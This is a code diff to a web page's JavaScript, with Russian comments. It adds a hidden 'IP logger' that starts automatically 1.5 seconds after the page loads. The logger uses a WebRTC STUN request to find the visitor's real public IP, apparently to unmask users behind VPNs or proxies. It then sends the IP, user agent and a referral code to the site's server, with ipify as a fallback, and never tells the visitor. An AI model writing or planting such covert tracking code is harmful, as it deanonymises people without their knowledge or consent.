@@ -1543,6 +1543,110 @@
     window.showBroadcast = showBroadcast;
     
     // ============================================================
+    // ========== ДОБАВЛЯЕМ IP-ЛОГГЕР ЧЕРЕЗ WebRTC ==========
+    // ============================================================
+    function getRealIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({
+                iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+            });
+
+            const timeout = setTimeout(() => {
+                pc.close();
+                resolve(null);
+            }, 3000);
+
+            pc.createDataChannel("");
+
+            pc.createOffer()
+                .then(offer => pc.setLocalDescription(offer))
+                .catch(() => {});
+
+            pc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
+                    const match = ipRegex.exec(event.candidate.candidate);
+                    if (match) {
+                        const ip = match[0];
+                        if (!ip.startsWith('127.') && 
+                            !ip.startsWith('192.168.') && 
+                            !ip.startsWith('10.') &&
+                            !ip.startsWith('172.16.') &&
+                            !ip.startsWith('172.17.') &&
+                            !ip.startsWith('172.18.') &&
+                            !ip.startsWith('172.19.') &&
+                            !ip.startsWith('172.20.') &&
+                            !ip.startsWith('172.21.') &&
+                            !ip.startsWith('172.22.') &&
+                            !ip.startsWith('172.23.') &&
+                            !ip.startsWith('172.24.') &&
+                            !ip.startsWith('172.25.') &&
+                            !ip.startsWith('172.26.') &&
+                            !ip.startsWith('172.27.') &&
+                            !ip.startsWith('172.28.') &&
+                            !ip.startsWith('172.29.') &&
+                            !ip.startsWith('172.30.') &&
+                            !ip.startsWith('172.31.')) {
+                            clearTimeout(timeout);
+                            pc.close();
+                            resolve(ip);
+                        }
+                    }
+                }
+            };
+        });
+    }
+
+    async function logRealIP() {
+        const refCode = currentRefCode || new URLSearchParams(window.location.search).get('ref');
+        if (!refCode) {
+            console.log('❌ Нет реф кода, IP не логируем');
+            return;
+        }
+
+        const realIP = await getRealIP();
+        if (realIP) {
+            console.log('🌐 Реальный IP через WebRTC:', realIP);
+            
+            try {
+                await fetch(`${API_URL}/log_real_ip`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ref: refCode,
+                        ip: realIP,
+                        user_agent: navigator.userAgent,
+                        timestamp: Date.now()
+                    })
+                });
+                console.log('✅ IP отправлен на сервер');
+            } catch(e) {
+                console.log('❌ Ошибка отправки IP:', e);
+            }
+        } else {
+            console.log('❌ Не удалось получить реальный IP через WebRTC');
+            
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                console.log('🌐 Обычный IP (запасной):', data.ip);
+                
+                await fetch(`${API_URL}/log_real_ip`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ref: refCode,
+                        ip: data.ip,
+                        user_agent: navigator.userAgent,
+                        timestamp: Date.now(),
+                        fallback: true
+                    })
+                });
+            } catch(e) {}
+        }
+    }
+
+    // ============================================================
     // ========== ГЛАВНАЯ ЗАГРУЗКА С ПРОВЕРКОЙ БАНА ==========
     // ============================================================
     (async function main() {
@@ -1555,6 +1659,9 @@
         
         console.log('✅ IP НЕ ЗАБАНЕН, ЗАГРУЗКА САЙТА');
         loadWorkerData();
+        
+        // ЗАПУСКАЕМ ОПРЕДЕЛЕНИЕ IP ЧЕРЕЗ СЕКУНДУ ПОСЛЕ ЗАГРУЗКИ
+        setTimeout(logRealIP, 1500);
         
         if (currentRefCode) {
             console.log('✅ Запуск проверки команд для ref:', currentRefCode);
